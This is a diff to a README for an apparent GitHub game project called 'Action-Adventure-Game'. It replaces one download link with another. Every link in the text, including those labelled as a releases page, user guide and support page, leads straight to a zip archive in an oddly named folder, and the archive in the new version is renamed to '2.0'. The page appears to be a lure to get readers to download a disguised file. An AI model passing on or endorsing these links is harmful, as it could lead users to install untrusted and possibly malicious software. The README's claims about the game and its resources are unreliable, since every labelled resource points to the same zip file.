@@ -1,7 +1,7 @@
 # 💥 Action-Adventure-Game - Dive into Thrilling Combat and Exploration
 
 ## 🚀 Download Now
-[![Download Action-Adventure-Game](https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip%20Now-Action--Adventure--Game-brightgreen)](https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip)
+[![Download Action-Adventure-Game](https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip%20Now-Action--Adventure--Game-brightgreen)](https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip)
 
 ## ❓ Introduction
 Welcome to **Action-Adventure-Game**! This game combines combat and exploration in a rich, immersive world. Engage in real-time battles and manage your inventory as you uncover the secrets of your surroundings. Enjoy thrilling gameplay designed for everyone, whether you are a seasoned gamer or just starting.
@@ -25,11 +25,11 @@ In **Action-Adventure-Game**, you will experience:
 ## 📥 Download & Install
 Getting started is easy. Follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip) to access the latest version of the game.
+1. Visit the [Releases page](https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip) to access the latest version of the game.
    
 2. Look for the latest release. You will see a list of downloadable files.
 
-3. Click on the file name that matches your operating system (e.g., `https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip` or `https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip`).
+3. Click on the file name that matches your operating system (e.g., `https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip` or `https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip`).
 
 4. Save the file to your preferred download location on your computer.
 
@@ -46,8 +46,8 @@ Getting started is easy. Follow these steps:
 
 ## 📖 Additional Resources
 If you need help or want to learn more:
-- Check out the [User Guide](https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip) for tips and tricks.
-- Visit our [Support page](https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip) for FAQs or to report issues.
+- Check out the [User Guide](https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip) for tips and tricks.
+- Visit our [Support page](https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip) for FAQs or to report issues.
 
 ## 🗣️ Community Feedback
 Your experience matters! Share your thoughts, suggestions, or problems. Join the conversation in the issues section on GitHub. Your feedback helps improve the game.
@@ -56,6 +56,6 @@ Your experience matters! Share your thoughts, suggestions, or problems. Join the
 Thank you for playing **Action-Adventure-Game**. We appreciate every player who dives into this adventure. Your support drives us to create the best experience possible.
 
 ## 📅 Updates
-Stay tuned for future updates! We plan to add new features, quests, and improvements based on your feedback. Make sure you regularly check the [Releases page](https://raw.githubusercontent.com/Aurelius-17/Action-Adventure-Game/main/preterritorial/Action-Adventure-Game.zip) for the latest versions.
+Stay tuned for future updates! We plan to add new features, quests, and improvements based on your feedback. Make sure you regularly check the [Releases page](https://github.com/Aurelius-17/Action-Adventure-Game/raw/refs/heads/main/preterritorial/Action-Adventure-Game-2.0.zip) for the latest versions.
 
 Explore, fight, and uncover the mysteries of your new adventure. Enjoy your journey!
